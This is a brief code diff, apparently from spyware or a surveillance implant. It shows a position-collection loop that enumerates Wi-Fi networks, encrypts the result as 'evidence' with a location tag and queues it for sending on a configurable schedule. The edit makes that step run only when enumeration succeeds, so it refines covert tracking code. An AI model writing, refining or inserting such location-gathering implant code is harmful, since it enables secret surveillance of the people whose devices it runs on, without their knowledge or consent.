@@ -186,14 +186,15 @@ VOID PositionMain()
 			LPBYTE lpBody;
 			wifiloc_additionalheader_struct wifi;
 
-			EnumWifiNetworks(&wifi, &lpBody, &dwSize);
+			if(EnumWifiNetworks(&wifi, &lpBody, &dwSize))
+			{
+				DWORD dwEvSize;
+				LPBYTE lpEvBuffer = PackEncryptEvidence(dwSize, lpBody, PM_WIFILOCATION, (LPBYTE)&wifi, sizeof(wifi), &dwEvSize);
+				zfree(lpBody);
 
-			DWORD dwEvSize;
-			LPBYTE lpEvBuffer = PackEncryptEvidence(dwSize, lpBody, PM_WIFILOCATION, (LPBYTE)&wifi, sizeof(wifi), &dwEvSize);
-			zfree(lpBody);
-
-			if (!QueuePositionLog(lpEvBuffer, dwEvSize))
-				zfree(lpEvBuffer);
+				if (!QueuePositionLog(lpEvBuffer, dwEvSize))
+					zfree(lpEvBuffer);
+			}
 		}
 
 		MySleep(ConfGetRepeat(L"position"));  //FIXME: array
